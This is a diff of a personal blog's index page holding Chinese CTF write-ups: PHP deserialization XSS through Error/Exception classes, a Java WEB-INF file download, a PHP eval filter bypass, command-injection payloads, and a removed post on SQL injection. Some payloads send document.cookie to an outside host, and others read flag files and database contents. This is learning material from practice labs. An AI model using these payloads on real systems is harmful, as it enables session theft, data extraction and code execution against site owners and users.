@@ -147,6 +147,78 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/17/XSS%E4%B9%8B%E5%85%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/17/XSS%E4%B9%8B%E5%85%89/" class="post-title-link" itemprop="url">XSS之光</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-17 13:52:42 / Modified: 15:05:37" itemprop="dateCreated datePublished" datetime="2021-03-17T13:52:42+08:00">2021-03-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>御剑扫后台，发现git泄露</p>
+<p>Githack扫出index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];</span><br><span class="line">echo unserialize($a);</span><br></pre></td></tr></table></figure>
+<p>反序列化漏洞，但是没有类，那么则需要一个内置类进行反序列化</p>
+<h2 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">大佬的话：</span><br><span class="line"></span><br><span class="line">Error</span><br><span class="line">适用于php7版本</span><br><span class="line"></span><br><span class="line">Error类就是php的一个内置类用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个to_String的方法。如果有个pop链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 echo 一个反序列化以后的类 的写法，前文说了当对象被当作一个字符串使用时候调用(如echo的时候)会触发__toString方法，这个也看开发人员吧，好的开发人员应该不会这么写，但也是一种挖洞的新思路（对我而言）。</span><br><span class="line"></span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45521281&#x2F;article&#x2F;details&#x2F;105812056</span><br></pre></td></tr></table></figure>
+<p>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; unserialize($_GET[&#39;daqiang&#39;]);</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>利用Error类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; new Error(&quot;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo urlencode($b);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;得：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D    生成的 urlencode($b)</span><br></pre></td></tr></table></figure>
+<p>url输入?daqiang=urlencode($b)  会有弹窗：1</p>
+<h2 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h2><p>原理和Error类一样，适用于php5和php7，更好用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; unserialize($_GET[&#39;yds&#39;]);</span><br><span class="line">echo $a;      </span><br><span class="line">?&gt;           </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; new Exception(&quot;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;得：O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span><br><span class="line">echo unserialize($c);</span><br></pre></td></tr></table></figure>
+<p>回到这个题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$daqiang &#x3D; new Exception(&quot;&lt;script&gt;window.open(&#39;http:&#x2F;&#x2F;a0a58185-02d8-4b85-8dbb-f5a991c8b45c.node3.buuoj.cn&#x2F;?&#39;+document.cookie);&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($daqiang));</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;window.open 是 javaScript 打开新窗口的方法</span><br><span class="line"></span><br><span class="line">也可以用window.location.href&#x3D;&#39;url&#39;来实现恶意跳转</span><br><span class="line">&lt;?php</span><br><span class="line">$daqiang &#x3D; new Exception(&quot;&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;8ff615f3-da70-4d1a-959f-f29d817ecd90.node3.buuoj.cn&#39;+document.cookie&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($daqiang));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或者用alert(document.cookie)直接弹出cookie，但此题不行，可能开了httponly（见附录）。</span><br><span class="line">&lt;?php</span><br><span class="line">$daiqng &#x3D; new Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($daqiang));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/shrine1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -309,10 +381,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-03-15 19:50:36 / Modified: 20:25:15" itemprop="dateCreated datePublished" datetime="2021-03-15T19:50:36+08:00">2021-03-15</time>
+              <time title="Created: 2021-03-15 19:50:36" itemprop="dateCreated datePublished" datetime="2021-03-15T19:50:36+08:00">2021-03-15</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-17 15:05:42" itemprop="dateModified" datetime="2021-03-17T15:05:42+08:00">2021-03-17</time>
+              </span>
 
           
 
@@ -335,6 +413,35 @@
 <p>不是命令，而是一个字符串，因为在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。</p>
 <p>2.引号旁边加空格是因为，如果不加，当两个函数执行并echo出来后就会变成：</p>
 <pre><code>\&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php\\</code></pre>
+<hr>
+<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br><span class="line"></span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<pre><code>/Download?filename=WEB-INF/web.xml</code></pre>
+<p>BP抓包，要用POST方法，漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p>
+<p>回显  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">       &lt;servlet-name&gt;FlagController&lt;&#x2F;servlet-name&gt;</span><br><span class="line">       &lt;servlet-class&gt;com.wm.ctf.FlagController</span><br><span class="line">       &lt;&#x2F;servlet-class&gt;</span><br></pre></td></tr></table></figure>
+<p>结合tomcat的项目存放路径经验试试下载FlagController.class</p>
+<p>最终payload</p>
+<pre><code>?filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre>
+<hr>
+<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>剽的大佬的blog <a target="_blank" rel="noopener" href="https://blog.csdn.net/r1727337824/article/details/108293359">https://blog.csdn.net/r1727337824/article/details/108293359</a></p>
+<p>git泄露,在Githack打开终端，</p>
+<pre><code>python Githack.py http://3d1f6c86-9f4b-443e-9714-0ca2673fe1c1.node3.buuoj.cn/.git/</code></pre>
+<p>文件夹中多了一个index.php文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#39;exp&#39;]))&#123;  &#x2F;&#x2F;传参exp</span><br><span class="line">    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;]))   &#x2F;&#x2F;过滤了常用的伪协议</span><br><span class="line">    &#123;</span><br><span class="line">        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#x2F;&#x2F;在得到的exp参数中匹配 [a-z,_]+((?R)?) 并转化为空，注意这里有(?R)?递归调用限制我们传入的参数只能是无参数函数或者是套函数，就是说假如我们传入参数为 exp&#x3D;system(&#39;ls&#39;);则匹配不成功;</span><br><span class="line">        &#123;</span><br><span class="line">            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) </span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];</span><br><span class="line">                @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>关于第二个过滤：</p>
+<p>假如我们传入exp=print_r(scandir(pos(localeconv())));因为匹配成功所以函数localeconv(),pos(),scandir(),print_r()用NULL替换后为；从而可以进入if从句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数扩展：</span><br><span class="line">scandir(’.’):扫描当前目录</span><br><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.</span><br><span class="line">pos(),current():返回数组第一个值</span><br></pre></td></tr></table></figure>
+<pre><code>    exp=print_r(scandir(pos(localeconv())));</code></pre>
+<p>数组操作函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end():数组指针指向最后一位</span><br><span class="line">next(): 数组指针指向下一位</span><br><span class="line">array_reverse(): 将数组颠倒</span><br><span class="line">array_rand(): 随机返回数组的键名</span><br><span class="line">array_flip()：交换数组的键和值</span><br></pre></td></tr></table></figure>
+<p>读取文件函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_get_content() :因为et被ban，所以不能使用</span><br><span class="line">readfile()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));&#x2F;&#x2F;反转数组顺序读取第二个元素内容（这种方法只能读取第二个或倒数第二个）</span><br><span class="line">exp&#x3D;show_source(array_rand(array_flip(scandir(pos(localeconv())))));&#x2F;&#x2F;随机返回数组的键名</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>url中img经过两次base64解码，一次hex解码得55.png</p>
+<p>要访问index.php，需要同样编码</p>
 
       
     </div>
@@ -723,7 +830,7 @@ resource=flag.php</code></pre>
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -737,7 +844,7 @@ resource=flag.php</code></pre>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/03/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">文件上传</a>
+            <a href="/2021/03/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">命令执行</a>
         </h2>
 
         <div class="post-meta">
@@ -749,6 +856,13 @@ resource=flag.php</code></pre>
 
               <time title="Created: 2021-03-03 20:50:21" itemprop="dateCreated datePublished" datetime="2021-03-03T20:50:21+08:00">2021-03-03</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-17 15:05:40" itemprop="dateModified" datetime="2021-03-17T15:05:40+08:00">2021-03-17</time>
+              </span>
 
           
 
@@ -761,7 +875,36 @@ resource=flag.php</code></pre>
     <div class="post-body" itemprop="articleBody">
 
       
-          
+          <h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>php语句最后的分号可用&gt;代替</p>
+<p>?c=system(‘ls’);查目录</p>
+<p>shell命令：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/BaiYiShaoNian/p/4831022.html">https://www.cnblogs.com/BaiYiShaoNian/p/4831022.html</a></p>
+<p>cp命令：复制 </p>
+<ul>
+<li><p>cp a.txt b.txt : 把文件a的内容复制到b文件</p>
+</li>
+<li><p>cp a.txt ./test : 把文件a复制到text目录下</p>
+</li>
+<li><p>cp -a test test2：递归的把目录test下所有文件（包括隐藏的文件）复制到新的目录 test2</p>
+</li>
+</ul>
+<p>把flag.txt内容搞到1.txt中</p>
+<p>?c=system(“cp fla?.txt 1.txt”);</p>
+<p>flag被过滤，用?代替g,(占位符?可代替任意字符)</p>
+<hr>
+<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>过滤了flag,system和php</p>
+<p>payload:</p>
+<pre><code>?c=`cp fla?.??? 1.txt`</code></pre>
+<p>``反引号在php中和system一样，代表命令执行</p>
+<hr>
+<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><img src="images/A%E7%A7%801.0.png" alt="A秀1.0.png"></p>
+<p>eval执行</p>
+<p>在之前的基础上还过滤了空格</p>
+<p>payload:</p>
+<pre><code>?c=eval($_GET[1]);&amp;1=system(&#39;cat flag.php&#39;);</code></pre>
+<p>1逃逸出了eval，不属于c，不接受过滤,也可以将cat用tac代替，则不需查源代码，可直接读取flag</p>
+<hr>
+<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p><img src="images/A%E7%A7%801.1.png" alt="A秀1.0.png"><br>在之前的基础上主要过滤了分号;左扩号( 反引号，echo等。</p>
+
       
     </div>
 
@@ -992,92 +1135,6 @@ $user-&gt;update_profile($username, serialize($profile));</code></pre>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/02/01/SQL%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/01/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-02-01 17:54:11" itemprop="dateCreated datePublished" datetime="2021-02-01T17:54:11+08:00">2021-02-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-02-18 18:00:25" itemprop="dateModified" datetime="2021-02-18T18:00:25+08:00">2021-02-18</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="1-buu-SUCTF-2019-EasySQL"><a href="#1-buu-SUCTF-2019-EasySQL" class="headerlink" title="1.buu-[SUCTF 2019]EasySQL"></a>1.buu-[SUCTF 2019]EasySQL</h1><p><img src="images/buusql1.0.png" alt="buu-sql.png"><br>发现昨天用的堆叠注入可以直接查表<br><img src="images/buusql1.0.png" alt="buu-sql.png"><br>发现了表Flag,但是无法用show columns from Flag读取其中的列<br>好，看看大佬们的WP：“后端既然能做到数字回显字母不回显，说明有一个 或 结构，而且不直接回显flag，但作为一道题目，from一定是from flag”猜出后端源码select $_POST[‘query’] || flag from Flag,<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/stevenonesir/article/details/110203051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5BSUCTF%202019%5DEasySQL&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-110203051.pc_search_result_hbase_insert&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/stevenonesir/article/details/110203051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5BSUCTF%202019%5DEasySQL&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-110203051.pc_search_result_hbase_insert&amp;spm=1018.2226.3001.4187</a><br>挺无语的，直接看大佬讲解吧<br>今天先搞别的        </p>
-<hr>
-<h1 id="buu-极客大挑战-2019-EasySQL"><a href="#buu-极客大挑战-2019-EasySQL" class="headerlink" title="buu-[极客大挑战 2019]EasySQL"></a>buu-[极客大挑战 2019]EasySQL</h1><p>进入靶机<br><img src="images/buusql2.0.png" alt="buu-sql.png"><br>用万能密码试一试<br><img src="images/buusql2.1.png" alt="buu-sql.png"><br>用户名和密码都输入   admin’ or ‘1’=’1<br>得到flag     </p>
-<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>先尝试万能密码登录，最后发现<br>?username=admin’–+&amp;password=1登陆成功  </p>
-<ul>
-<li>查字段<br>?username=admin’ order by 3–+&amp;password=1<br>报错：<br>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘der 3– ‘ and password=’1’’ at line 1，发现语句中order by 就剩der了，说明过滤了or和by,<br>双写绕过：?username=admin’ oorrder bbyy 4–+&amp;password=1</li>
-<li>查得有3个字段，开始联合查询<br>?username=-admin’ union select 1,2,3–+&amp;password=1找回显，<br>又有报错：check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘1,2,3– ‘ and password=’1’’ at line 1<br>过滤了union 和 select，再双写绕过：<br>?username=-admin’ ununionion seselectlect 1,2,3–+&amp;password=1有回显  </li>
-<li>查当前数据库为geek,查该数据库的表：<br>?username=-admin’ ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema=’geek’–+&amp;password=1，有报错：<br>check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘.tables table_schema=’geek’– ‘ and password=’1’’ at line 1<br>过滤了from和where，继续双写绕过<br>结果：Table ‘infmation_schema.tables’ doesn’t exist，<br>卧槽，小细节啊，上面过滤了or，所以information里面的or也要双写<br>（查所有数据库，查ctf里面的表，查Flag里面的列，查flag里面的字段）</li>
-</ul>
-<hr>
-<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>报错注入：  （过滤了空格，用括号代替）<br>查数据库</p>
-<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23</code></pre>
-<p>查表</p>
-<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;geek&#39;)))))%23</code></pre>
-<p>查字段</p>
-<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))%23</code></pre>
-<p>查数据password</p>
-<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))%23</code></pre>
-<p>发现只爆一半</p>
-<pre><code>/check.php?username=admin&amp;password=admin%27^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23</code></pre>
-<p>left right查左右</p>
-<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>BP抓包fuzz，发现过滤了or xor = 等，<br>没过滤union select，可以查</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1147,7 +1204,7 @@ $user-&gt;update_profile($username, serialize($profile));</code></pre>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1156,7 +1213,7 @@ $user-&gt;update_profile($username, serialize($profile));</code></pre>
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
